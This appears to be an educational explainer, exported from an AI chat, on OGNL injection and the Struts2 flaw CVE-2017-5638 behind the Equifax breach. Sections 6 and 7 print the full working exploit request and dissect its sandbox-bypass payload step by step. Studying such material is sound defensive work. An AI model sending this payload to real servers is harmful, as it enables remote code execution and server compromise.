# OGNL Injection: The Danger of Server-Side Script Injection

> Source: https://gemini.google.com/share/2d08b7d55e52  
> Created: April 5, 2026

---

## 1. What is OGNL?

**OGNL (Object-Graph Navigation Language)** is a powerful expression language primarily used in Java environments — most famously in the early Apache Struts2 framework. It allows developers to access data within Java object trees, invoke object methods, and perform complex operations using simple syntax strings.

### Breaking Down the Name

| Term | Meaning |
|------|---------|
| **Object** | Java objects in memory |
| **Graph** | The interconnected network of objects (e.g., `User` → `Address` → `City`) |
| **Navigation** | Traversing along object references to reach nested data |
| **Language** | A syntax/expression language to express these traversals |

**Without OGNL** you need verbose Java code:
```java
if (user != null && user.getAddress() != null) {
    return user.getAddress().getCity().getName();
}
```

**With OGNL**, a single expression suffices:
```
user.address.city.name
```

### Core OGNL Features
1. **Get/Set values** — directly access properties via path
2. **Method invocation** — call object methods in expressions, e.g. `user.sayHello()`
3. **Type conversion** — auto-converts strings (e.g. `"18"`) to Java types (e.g. `int 18`)
4. **Collection operations** — filter and project arrays or Lists

---

## 2. Why is it an "Injection"?

The core of all injection vulnerabilities: **the program treats user-supplied "data" as "instructions" to execute.**

| Injection Type | Data Treated As |
|----------------|-----------------|
| SQL Injection | SQL commands |
| XSS (Script Injection) | JavaScript in the browser |
| OGNL Injection | OGNL expressions executed by the server-side engine |

---

## 3. OGNL Injection vs. Traditional Script Injection (XSS)

| | XSS (Client-Side) | OGNL Injection (Server-Side) |
|---|---|---|
| **Execution location** | Client (user's browser) | Server-side |
| **Language** | JavaScript | Java (via OGNL engine) |
| **Core harm** | Cookie theft, session hijacking | Remote Code Execution (RCE), full server takeover |
| **Severity** | Medium to High | Extremely High (Fatal) |

OGNL injection is classified as **RCE (Remote Code Execution)** or a close relative of **SSTI (Server-Side Template Injection)**.

> One-line summary: It's not just script injection — it's a "code blade" stabbed directly into the server's heart.

---

## 4. How Does it Escalate to RCE?

OGNL can not only read/write properties — it can **call Java methods**, including system commands:

```
java.lang.Runtime.getRuntime().exec("whoami")
```

Once the server parses this expression, the attacker gains direct control of the server.

---

## 5. CVE-2017-5638 — The Equifax Vulnerability

This is the most famous OGNL injection case. It directly caused the **Equifax data breach**, exposing the sensitive information of over **147 million Americans**.

### Root Cause: Flawed Error-Handling Mechanism

The vulnerability chain in Apache Struts2 using the **Jakarta Multipart parser**:

1. **Malformed input**: The attacker sends an HTTP request with a malicious OGNL expression in the `Content-Type` header instead of a valid `multipart/form-data` value.
2. **Exception triggered**: The parser detects the invalid `Content-Type` format and throws an error.
3. **Dangerous error message**: Struts2's exception handler tries to embed the user-supplied `Content-Type` string (containing the malicious code) into the error message.
4. **Re-parsed by OGNL engine**: The critical flaw — Struts2 then passes this error message (containing user input) to the OGNL engine for evaluation.

### Why Was the Impact So Severe?

1. **No authentication required** — attackers only needed access to any Struts2-powered endpoint
2. **Trivially easy to exploit** — automated scripts spread online immediately after disclosure; even script kiddies could use it
3. **Default parser** — many developers didn't even know their system used this vulnerable parser

### Affected Versions
- Struts 2.3.5 to 2.3.31
- Struts 2.5 to 2.5.10

### Fix
- Modified exception-handling logic to **stop passing user-supplied `Content-Type` to the OGNL engine**
- Strengthened the OGNL sandbox with stricter blacklists and execution context checks

---

## 6. HTTP Request Deep Dive

### Normal (Legitimate) File Upload Request

```http
POST /system/file-save HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryabc123
Content-Length: 188
Connection: close

------WebKitFormBoundaryabc123
Content-Disposition: form-data; name="myFile"; filename="hello.txt"
Content-Type: text/plain

Hello, this is a test file!
------WebKitFormBoundaryabc123--
```

**Field-by-field breakdown:**

| Field | Meaning |
|-------|---------|
| `POST` | Action: push data to the server |
| `/system/file-save` | Route path defined by the backend developer (could be `.action`, `.do`, `.php`, or no extension) |
| `HTTP/1.1` | Protocol version |
| `Host` | Target server domain name |
| `Content-Type: multipart/form-data; boundary=...` | Declares a multi-part upload; the `boundary` string separates each part |
| `Content-Length` | Total body size in bytes |
| *(blank line)* | HTTP requires a blank line between headers and body |
| `------WebKitFormBoundaryabc123` | Start-of-part delimiter |
| `Content-Disposition` | Declares this part is form data, with field name `myFile` and filename `hello.txt` |
| File content | The actual file bytes |
| `------WebKitFormBoundaryabc123--` | End-of-request delimiter (note the trailing `--`) |

---

### Malicious Request (CVE-2017-5638 Exploit)

```http
POST /system/file-save HTTP/1.1
Host: www.company.com
Content-Type: .%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc.exe'))}.multipart/form-data
Content-Length: 0
Connection: close
```

**Why this structure:**

| Part | Purpose |
|------|---------|
| `.` (leading dot) | Intentionally malformed to cause a parse error and trigger the exception handler |
| `%{ ... }` | OGNL trigger syntax — the engine evaluates everything inside the braces |
| `.multipart/form-data` (trailing) | Disguise suffix to evade naive filters |
| `Content-Length: 0` | No actual file content needed — the server is already compromised at the header stage |

---

## 7. The OGNL Payload — Line-by-Line Analysis

Extracted payload (reformatted for readability):

```java
(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
(#ognlUtil.getExcludedPackageNames().clear()).
(#ognlUtil.getExcludedClasses().clear()).
(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
(@java.lang.Runtime@getRuntime().exec('calc.exe'))
```

### Step 1 — Get the Container (Master Key)

```
(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
```

| Token | Meaning |
|-------|---------|
| `( )` | Parentheses — wrap a logical unit, control execution order |
| `#container` | Declare a variable named `container` (`#` defines/references a variable in OGNL) |
| `=` | Assignment |
| `#context` | The pre-defined Map in the ValueStack storing all request environment info |
| `['...']` | Key-value access — retrieve the value at this key from the `context` Map |
| `.` | Chain connector — end of this step, begin next |

**Purpose:** Obtain the Struts2 IoC container — the server's "master key room."

---

### Step 2 — Get the OGNL Utility Instance

```
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
```

| Token | Meaning |
|-------|---------|
| `#ognlUtil` | Declare a variable named `ognlUtil` |
| `.getInstance(...)` | Call a method — ask the container to return the existing `OgnlUtil` instance |
| `@...@class` | OGNL static class reference syntax — `@ClassName@` targets the class itself (not an instance) |

**Purpose:** Hijack the already-instantiated `OgnlUtil` object from server memory (no `new` needed — the server already built it).

> Why no `new`? The attacker is not creating a new object; they are **commandeering an existing one** from the server's memory via the container.

---

### Steps 3 & 4 — Clear the Blacklists (Dismantle the Firewall)

```
(#ognlUtil.getExcludedPackageNames().clear()).
(#ognlUtil.getExcludedClasses().clear()).
```

| Token | Meaning |
|-------|---------|
| `getExcludedPackageNames()` | Get the list of blacklisted package names (e.g. `java.lang.*`) |
| `.clear()` | Standard Java `List` method — empties the list completely |
| `getExcludedClasses()` | Get the list of blacklisted class names |

**Purpose:** Delete all the restrictions that prevent OGNL from calling dangerous classes like `java.lang.Runtime`.

---

### Step 5 — Unlock God Mode (Override MemberAccess)

```
(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
```

| Token | Meaning |
|-------|---------|
| `#context` | The `OgnlContext` object (implements `Map` but has extra methods) |
| `.setMemberAccess(...)` | Set the access-control strategy ("security guard rulebook") |
| `@ognl.OgnlContext@` | Reference the `OgnlContext` class itself via static syntax |
| `DEFAULT_MEMBER_ACCESS` | A static constant in OGNL source code — the most permissive access level (allows all static, private, and public members) |

**What it modifies:** The `MemberAccess` policy object inside `OgnlContext` — the "rulebook" that normally forbids calling static methods, accessing private variables, and touching sensitive packages.

**Effect:** Replaces the strict Struts2 security guard with a fully permissive one. Without this step, calling `Runtime.exec()` would be blocked even after clearing the blacklists.

---

### Step 6 — Execute (The Kill Shot)

```
(@java.lang.Runtime@getRuntime().exec('calc.exe'))
```

| Token | Meaning |
|-------|---------|
| `@java.lang.Runtime@` | Target the `Runtime` class (the Java system runtime controller) |
| `getRuntime()` | Static method that returns the single `Runtime` instance (Singleton pattern — `new Runtime()` is private/forbidden by design) |
| `.exec('calc.exe')` | Execute a system command — here: pop up Calculator (proof-of-concept). In real attacks: download malware, read databases, delete files |
| `'...'` | Single-quoted string argument (OGNL string literal syntax) |

> Why no `new` for `Runtime`? Java's `Runtime` uses the **Singleton pattern** — its constructor is private. The only way to get it is `Runtime.getRuntime()`, which returns the existing instance.

---

## 8. The ValueStack (Object Stack) Explained

The **ValueStack** is Struts2's "vertical storage rack" — all relevant Java objects (Action, Session, error messages, etc.) are stacked on it in order. When you write `#container`, OGNL scans the stack top-to-bottom until it finds a matching object.

### OGNL Symbol Quick Reference

| Symbol | Meaning |
|--------|---------|
| `#var` | Define or reference a variable on the stack |
| `#context` | Access the `OgnlContext` (Map of request environment) |
| `@Class@` | Reference a static class (the "blueprint") |
| `@Class@method()` | Call a static method directly on the blueprint |
| `.` | Navigate — move from one object to a child property or method call |
| `['key']` | Map key access |
| `( )` | Grouping — ensures execution order; OGNL executes code on sight of parentheses |

### Role of the ValueStack in CVE-2017-5638

1. Attacker injects code via the `Content-Type` header
2. Struts2 places the malformed header into the **ValueStack's error-handling zone**
3. The OGNL engine, while processing the ValueStack, **encounters and executes the injected code**

Every `#` is planting a flag on the stack. Every `.` is pathfinding along it.

---

## 9. Attack Chain Summary

```
Attacker sends malicious Content-Type
        ↓
Jakarta Multipart parser throws exception
        ↓
Struts2 error handler embeds Content-Type into error message
        ↓
OGNL engine evaluates the error message (the flaw)
        ↓
Step 1: Obtain IoC container
        ↓
Step 2: Get OgnlUtil instance (security manager)
        ↓
Steps 3–4: Clear package and class blacklists
        ↓
Step 5: Replace MemberAccess with fully permissive DEFAULT
        ↓
Step 6: Runtime.exec() — arbitrary command execution (RCE)
```

---

## 10. Why Does a Single `.` Cause Code Execution Instead of Just an Error?

> Important clarification: Struts2 (especially the 2017 version) is a **synchronous, blocking** Java web framework. It has no `await`, `Future`, or async concepts (those belong to Node.js or Dart/Flutter). Requests run on a single thread from start to finish.

### The Mechanism — "Helpful" Error Handling

The reason a simple `.` leads to code execution rather than just a 500-error page is Struts2's error-handling logic being **too smart for its own good**.

#### Step 1 — The `.` Serves as a Trigger

The Jakarta Multipart parser checks the `Content-Type` format when processing file uploads:
- Valid format: `multipart/form-data; boundary=xxx`
- Leading `.` makes it unrecognizable — the parser immediately throws an **Exception** and wraps the entire illegal string into the error message.

#### Step 2 — The Fatal "Kindness": Double-Parsing the Error Message

This is the core flaw. To generate **friendly, internationalized (i18n) error pages**, Struts2 passes the error message string through a `findText` function instead of treating it as dead text.

The execution flow:
```
Parser throws error → error message: "Cannot handle type: .%{malicious code}..."
        ↓
Struts2 error handler receives the string
        ↓
Thinks: "This error message might contain dynamic variables — let me run it through the OGNL engine"
        ↓
OGNL engine scans the string, finds %{ ... } — the execution trigger signal
        ↓
Executes the payload
```

#### Step 3 — Why Not Just Return an Error Immediately?

| Expected behavior | Actual Struts2 behavior |
|---|---|
| Detect error → throw exception → return 500 page immediately | Detect error → throw exception → **run OGNL on the error message to build a nice error page** → code executes before the page is even returned |

#### Minimal Example

```
Input: .%{1+1}
Parser: Invalid format! Error! Error content is ".%{1+1}"
Error handler: Let me "translate" this error... I see %{1+1}, let me compute → result is 2
Final output: "Cannot handle type: .2"
```

In this translation/computation step, `calc.exe` would have already been executed.

#### The Fix

The official patch was direct: **in file upload error handling, never pass the error message to the OGNL engine for parsing.**

---

## 11. Takeaway

CVE-2017-5638 is the textbook OGNL injection case. It proves that even a seemingly harmless "print error message" feature, if it hands user input to a powerful expression engine without sanitization, becomes a maximum-severity Remote Code Execution disaster.

The terror of OGNL injection: attackers operate like "ghosts" — directly manipulating **already-existing powerful objects in server memory** without needing to allocate any resources themselves.
